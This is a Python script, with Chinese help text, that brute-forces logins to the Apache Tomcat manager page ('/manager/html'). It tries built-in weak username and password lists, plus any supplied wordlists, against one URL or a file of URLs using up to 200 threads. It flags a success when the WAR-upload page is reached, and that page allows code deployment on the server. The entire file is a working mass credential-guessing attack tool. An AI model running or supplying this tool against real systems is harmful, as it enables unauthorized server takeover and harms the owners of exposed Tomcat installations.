import requests
import base64
import argparse,os
from multiprocessing.dummy import Pool
import warnings
warnings.filterwarnings('ignore')

def args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',dest="url",required=True, type=str,help="目标url或url文件")
    parser.add_argument('-n', '--name', dest="name", required=False, type=str, help="爆破的用户或用户文件。")
    parser.add_argument('-p', '--password', dest="password", required=False, type=str, help="爆破的密码或密码文件。")
    parser.add_argument('-t', '--thread', dest="thread", required=False, default=200, type=int, help="爆破的进程数，默认200。")

    return parser.parse_args()

user_list = ['admin','tomcat','root','manager']
pass_list = ['admin','tomcat','123456','123','root']

def req_exp(url):
    url = url.rstrip('/') + '/manager/html'
    for user in user_list:
        for passwd in pass_list:
            mm = user+":"+passwd
            auth = base64.b64encode(mm.encode('utf-8')).decode('utf-8')
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
                'Authorization': 'Basic ' + auth
            }
            try:
                rep = requests.get(url,headers=headers,verify=False,timeout=15)
                # print(url,rep.text)
                if rep.status_code == 200 and "Select WAR file to upload" in rep.text:
                    print('[+] 找到一个Tomcat弱口令,URL为：' + url + ' ,密码为：' + mm)
                    return True
            # print(headers)
            except Exception as e:
                pass

def get_dic(name,password):
    if name != None:
        if os.path.exists(name):
            with open(name,mode='r',encoding='utf-8') as f:
                for i in f:
                    user = i.replace('\n','')
                    if user not in user_list:
                        user_list.append(user)
        elif name not in user_list:
              user_list.append(name)
    if password != None:
        if os.path.exists(password):
            with open(password,mode='r',encoding='utf-8') as f:
                for i in f:
                    passwd = i.replace('\n','')
                    if passwd not in pass_list:
                        pass_list.append(passwd)
        elif password not in pass_list:
              pass_list.append(password)


def scan(target,thread):
    url_list = []
    if os.path.exists(target):
        with open(target,mode='r',encoding='utf-8') as f:
            for i in f:
                url = i.replace('\n','')
                url_list.append(url)
        # 创建进程池
        pool = Pool(thread)
        pool.map(req_exp,url_list)
        pool.close()
        pool.join()
    else:
        req_exp(target)

if __name__ == '__main__':
    args = args()
    get_dic(args.name,args.password)
    scan(args.url,args.thread)